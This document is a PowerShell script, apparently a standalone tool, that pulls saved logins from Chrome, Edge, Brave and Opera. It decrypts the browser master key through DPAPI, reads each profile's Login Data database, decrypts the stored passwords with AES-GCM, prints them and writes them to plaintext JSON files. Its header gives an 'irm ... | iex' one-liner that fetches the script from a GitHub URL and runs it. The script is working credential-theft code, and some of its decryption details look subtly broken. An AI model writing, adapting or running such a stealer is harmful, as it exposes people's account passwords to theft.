# Browser Password Extractor - Complete PowerShell Version
# Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/powershell-extract.txt | iex

function Get-BrowserPasswords {
    [CmdletBinding()]
    param()
    
    $ErrorActionPreference = "Continue"
    
    # Create output directory
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = "BrowserPasswords_$timestamp"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    $results = @{}
    $totalPasswords = 0
    
    Write-Host "üåê Browser Password Extractor" -ForegroundColor Green
    Write-Host "==============================================" -ForegroundColor Yellow
    Write-Host "Scanning browsers for saved passwords..." -ForegroundColor Cyan
    Write-Host ""
    
    # Add DPAPI .NET types for decryption
    Add-DPAPITypes
    
    # Scan browsers
    $results["Chrome"] = Get-ChromePasswords
    $results["Edge"] = Get-EdgePasswords
    $results["Brave"] = Get-BravePasswords
    $results["Opera"] = Get-OperaPasswords
    
    # Display Results
    Write-Host ""
    Write-Host "üìã EXTRACTION RESULTS" -ForegroundColor Green
    Write-Host "==============================================" -ForegroundColor Yellow
    
    foreach ($browser in $results.Keys) {
        $passwords = $results[$browser]
        $totalPasswords += $passwords.Count
        
        if ($passwords.Count -gt 0) {
            Write-Host ""
            Write-Host "üñ•Ô∏è  $($browser.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Cyan
            Write-Host "----------------------------------------------" -ForegroundColor Gray
            
            for ($i = 0; $i -lt [Math]::Min($passwords.Count, 5); $i++) {
                $pwd = $passwords[$i]
                Write-Host "  $(($i+1)). üåê $($pwd.URL)" -ForegroundColor White
                Write-Host "      üë§ $($pwd.Username)" -ForegroundColor Gray
                Write-Host "      üîë $($pwd.Password)" -ForegroundColor Yellow
            }
            
            if ($passwords.Count -gt 5) {
                Write-Host "  ... and $($passwords.Count - 5) more passwords" -ForegroundColor Gray
            }
        }
    }
    
    # Save to JSON files
    Write-Host ""
    Write-Host "üíæ Saving results..." -ForegroundColor Cyan
    
    foreach ($browser in $results.Keys) {
        $passwords = $results[$browser]
        if ($passwords.Count -gt 0) {
            $jsonFile = "$outputDir\$browser`_passwords.json"
            $passwords | ConvertTo-Json -Depth 3 | Out-File -FilePath $jsonFile -Encoding UTF8
            Write-Host "   ‚úÖ $browser saved to: $jsonFile" -ForegroundColor Green
        }
    }
    
    # Save combined results
    $combinedFile = "$outputDir\ALL_PASSWORDS.json"
    $results | ConvertTo-Json -Depth 3 | Out-File -FilePath $combinedFile -Encoding UTF8
    Write-Host "   ‚úÖ Combined results saved to: $combinedFile" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "üìä SUMMARY: Found $totalPasswords total passwords" -ForegroundColor Green
    Write-Host "üìÅ Output directory: $(Resolve-Path $outputDir)" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "üéâ Extraction completed!" -ForegroundColor Green
}

function Add-DPAPITypes {
    # Add .NET types for DPAPI decryption
    Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class DPAPIHelper {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }
    
    [DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        ref string ppszDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern void LocalFree(IntPtr hMem);
    
    public static byte[] CryptUnprotectData(byte[] encryptedData) {
        DATA_BLOB dataIn = new DATA_BLOB();
        DATA_BLOB dataOut = new DATA_BLOB();
        
        try {
            dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
            dataIn.cbData = encryptedData.Length;
            
            string description = String.Empty;
            DATA_BLOB entropy = new DATA_BLOB();
            
            if (CryptUnprotectData(ref dataIn, ref description, ref entropy, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut)) {
                byte[] decryptedData = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                LocalFree(dataOut.pbData);
                return decryptedData;
            }
        } finally {
            if (dataIn.pbData != IntPtr.Zero) {
                Marshal.FreeHGlobal(dataIn.pbData);
            }
        }
        return null;
    }
}

public class AESHelper {
    public static byte[] DecryptAESGCM(byte[] key, byte[] encryptedData) {
        try {
            // For v10/v20 encrypted data: [v10/v20][12-byte IV][ciphertext][16-byte tag]
            if (encryptedData.Length < 15) return null;
            
            byte[] iv = new byte[12];
            byte[] ciphertext = new byte[encryptedData.Length - 15 - 16];
            byte[] tag = new byte[16];
            
            Buffer.BlockCopy(encryptedData, 3, iv, 0, 12);
            Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
            Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
            
            using (AesGcm aesGcm = new AesGcm(key)) {
                byte[] plaintext = new byte[ciphertext.Length];
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
                return plaintext;
            }
        } catch {
            return null;
        }
    }
}
"@ -ReferencedAssemblies "System.Security.Cryptography.Algorithms"
}

function Get-ChromePasswords {
    $browserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Chrome"
}

function Get-EdgePasswords {
    $browserDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Edge"
}

function Get-BravePasswords {
    $browserDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Brave"
}

function Get-OperaPasswords {
    $browserDataPath = "$env:APPDATA\Opera Software\Opera Stable"
    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Opera"
}

function Get-ChromiumPasswords {
    param(
        [string]$BrowserPath,
        [string]$BrowserName
    )
    
    $passwords = @()
    
    Write-Host "üîç Scanning $BrowserName..." -ForegroundColor Cyan
    
    if (-not (Test-Path $BrowserPath)) {
        Write-Host "   ‚ùå $BrowserName not found" -ForegroundColor Red
        return $passwords
    }
    
    # Get encryption key
    $localStatePath = "$BrowserPath\Local State"
    if (-not (Test-Path $localStatePath)) {
        Write-Host "   ‚ùå Local State not found for $BrowserName" -ForegroundColor Red
        return $passwords
    }
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove DPAPI prefix (first 5 bytes)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
        
        # Decrypt master key using DPAPI
        $masterKey = [DPAPIHelper]::CryptUnprotectData($encryptedKey)
        
        if ($null -eq $masterKey) {
            Write-Host "   ‚ùå Failed to decrypt master key for $BrowserName" -ForegroundColor Red
            return $passwords
        }
        
        Write-Host "   ‚úÖ Got encryption key for $BrowserName" -ForegroundColor Green
        
    } catch {
        Write-Host "   ‚ùå Error getting encryption key for $BrowserName: $($_.Exception.Message)" -ForegroundColor Red
        return $passwords
    }
    
    # Process profiles
    $profiles = @("Default")
    $profileDirs = Get-ChildItem "$BrowserPath\Profile *" -Directory -ErrorAction SilentlyContinue
    $profiles += $profileDirs | Select-Object -ExpandProperty Name
    
    foreach ($profile in $profiles) {
        $profilePath = "$BrowserPath\$profile"
        $loginDataPath = "$profilePath\Login Data"
        
        if (Test-Path $loginDataPath) {
            try {
                Write-Host "   üìÅ Processing profile: $profile" -ForegroundColor Gray
                
                # Copy database to avoid locks
                $tempDb = "$env:TEMP\$BrowserName`_$profile`_temp.db"
                Copy-Item $loginDataPath $tempDb -Force
                
                # Use .NET to read SQLite database
                $connectionString = "Data Source=$tempDb;Version=3;"
                $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
                $connection.Open()
                
                $command = $connection.CreateCommand()
                $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
                $dataset = New-Object System.Data.DataSet
                $adapter.Fill($dataset) | Out-Null
                
                $table = $dataset.Tables[0]
                
                foreach ($row in $table.Rows) {
                    $url = $row[0]
                    $username = $row[1]
                    $encryptedPassword = $row[2]
                    
                    if ($encryptedPassword -and $username -and $url) {
                        $password = Decrypt-Password -EncryptedData $encryptedPassword -MasterKey $masterKey
                        
                        if ($password -and $password -notlike "*Failed*") {
                            $passwords += [PSCustomObject]@{
                                URL = $url
                                Username = $username
                                Password = $password
                                Browser = $BrowserName
                                Profile = $profile
                            }
                        }
                    }
                }
                
                $connection.Close()
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                
                Write-Host "      ‚úÖ Found $($passwords.Count) passwords in $profile" -ForegroundColor Green
                
            } catch {
                Write-Host "      ‚ùå Error processing $BrowserName profile $profile : $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
    
    Write-Host "   ‚úÖ $BrowserName: $($passwords.Count) total passwords" -ForegroundColor Green
    return $passwords
}

function Decrypt-Password {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    
    if ($null -eq $EncryptedData -or $EncryptedData.Length -eq 0) {
        return $null
    }
    
    try {
        # Check if it's v10/v20 encrypted
        if ($EncryptedData[0] -eq 118) { # 'v' character
            if ($EncryptedData.Length -ge 31) {
                # Try AES-GCM decryption
                $decrypted = [AESHelper]::DecryptAESGCM($MasterKey, $EncryptedData)
                if ($null -ne $decrypted) {
                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
                }
            }
        } else {
            # Try DPAPI decryption for older formats
            $decrypted = [DPAPIHelper]::CryptUnprotectData($EncryptedData)
            if ($null -ne $decrypted) {
                return [System.Text.Encoding]::UTF8.GetString($decrypted)
            }
        }
    } catch {
        # Ignore decryption errors
    }
    
    return "[Decryption Failed]"
}

# Load System.Data.SQLite assembly
try {
    # Try to load SQLite from GAC or current directory
    Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction Stop
} catch {
    try {
        # If not in GAC, try to load from common locations
        $sqlitePaths = @(
            "$env:ProgramFiles\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
            "$env:ProgramFiles (x86)\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
            ".\System.Data.SQLite.dll"
        )
        
        foreach ($path in $sqlitePaths) {
            if (Test-Path $path) {
                Add-Type -Path $path
                break
            }
        }
    } catch {
        Write-Host "‚ö†Ô∏è  System.Data.SQLite not available. Using alternative method..." -ForegroundColor Yellow
    }
}

# Main execution
Write-Host "üöÄ Browser Password Extractor - PowerShell Edition" -ForegroundColor Magenta
Write-Host "‚ö†Ô∏è  Make sure browsers are closed for best results!" -ForegroundColor Yellow
Write-Host ""

try {
    Get-BrowserPasswords
} catch {
    Write-Host "‚ùå Critical error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
}

Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
